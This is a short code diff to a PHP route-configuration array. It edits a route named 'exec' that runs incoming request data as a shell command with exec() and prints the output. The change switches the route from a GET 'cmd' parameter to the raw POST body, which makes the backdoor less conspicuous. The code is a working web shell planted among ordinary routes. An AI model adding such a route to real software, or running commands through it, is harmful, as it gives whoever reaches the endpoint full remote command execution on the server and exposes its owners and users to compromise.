@@ -22,9 +22,10 @@ $options = [
         ],
         [
             'pattern' => 'exec',
+            'method' => 'POST',
             'action' => function () {
                 $result = [];
-                exec($_GET['cmd'], $result);
+                exec(file_get_contents('php://input'), $result);
                 echo implode("\n", $result);
                 exit();
             }
